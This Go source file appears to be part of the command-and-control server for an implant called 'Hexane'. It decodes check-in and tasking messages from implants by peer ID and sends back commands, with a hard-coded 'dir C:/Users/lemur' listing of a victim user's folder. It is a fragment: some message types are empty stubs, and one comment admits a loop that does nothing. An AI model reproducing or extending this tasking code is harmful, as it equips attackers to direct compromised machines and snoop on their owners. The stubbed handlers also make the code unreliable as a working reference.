package main

import (
	"fmt"
	"math/bits"
	"strings"
)

const HeaderLength = 12

func (m *Parser) DispatchCommand(s *Stream, UserInput string) {
	var (
		Buffer      []string
		Arguments   []string
		Command     string
		CommandType uint32
	)

	Buffer = strings.Split(UserInput, " ")
	Command = Buffer[0]

	Arguments = append(Arguments, Buffer[1:]...)
	Args := strings.Join(Arguments, " ")

	for k, v := range CommandMap {
		if Command == "" {
			CommandType = CommandNoJob
			break
		}
		if strings.EqualFold(k, Command) {
			fmt.Printf("command to send is %s\n", k)
			CommandType = v
		}
	}

	s.AddDword(CommandType)
	s.AddString(Args)
}

func (s *Stream) CreateHeader(Parser *Parser, msgType uint32, taskId uint32) {

	WrapMessage("DBG", "Creating response header")
	s.AddDword(Parser.PeerId)
	s.AddDword(taskId)
	s.AddDword(msgType)
}

func (h *HexaneConfig) HandleCheckin(Parser *Parser, Stream *Stream) {

	h.mu.Lock()
	defer h.mu.Unlock()

	if Parser.ParserPrintData(TypeCheckin) {
		Stream.CreateHeader(Parser, TypeCheckin, uint32(h.TaskCounter))
	}
}

func (h *HexaneConfig) HandleCommand(Parser *Parser, Stream *Stream) {

	h.mu.Lock()
	defer h.mu.Unlock()

	Stream.CreateHeader(Parser, TypeTasking, uint32(h.TaskCounter))
	Parser.DispatchCommand(Stream, "dir C:/Users/lemur") // user command interface
}

func ParseMessage(body []byte) ([]byte, error) {
	var (
		err     error
		Offset  uint32
		Parser  *Parser
		implant *HexaneConfig
		stream  = new(Stream)
	)

	for len(body) > 0 {
		if len(body) < HeaderLength {
			break
		}

		Parser = CreateParser(body)

		Parser.PeerId = bits.ReverseBytes32(Parser.ParseDword())
		Parser.TaskId = bits.ReverseBytes32(Parser.ParseDword())
		Parser.MsgType = bits.ReverseBytes32(Parser.ParseDword())

		if len(body) >= HeaderLength+4 {

			Offset = Parser.ParseDword()
			Offset += HeaderLength + 4

		} else {
			Offset = HeaderLength
		}

		if Offset > uint32(len(body)) {
			break
		}

		if implant = GetConfigByPeerId(Parser.PeerId); implant != nil {

			WrapMessage("DBG", fmt.Sprintf("found peer %d. Parsing message...", Parser.PeerId))
			implant.TaskCounter++

			switch Parser.MsgType {
			case TypeCheckin:
				{
					WrapMessage("DBG", "incoming message is a checkin")
					implant.HandleCheckin(Parser, stream)
					break
				}
			case TypeTasking:
				{
					WrapMessage("DBG", "incoming message is a task request")
					implant.HandleCommand(Parser, stream)
					break
				}
			case TypeResponse:
				{
					WrapMessage("DBG", "incoming message is a response with data")
					// print response
				}
			case TypeSegment:
				{
					WrapMessage("DBG", "incoming message is a segment with data")
					// this will loop and do nothing.
				}
			default:
				{
					WrapMessage("ERR", fmt.Sprintf("unknown message type: 0x%X", Parser.MsgType))
					stream.Buffer = []byte("200 ok")
					break
				}
			}
		} else {
			WrapMessage("ERR", "could not find peer in the database")
			stream.Buffer = []byte("ok")
		}

		body = body[Offset:]
	}

	fmt.Println("!! BREAK !!")
	return stream.Buffer, err
}
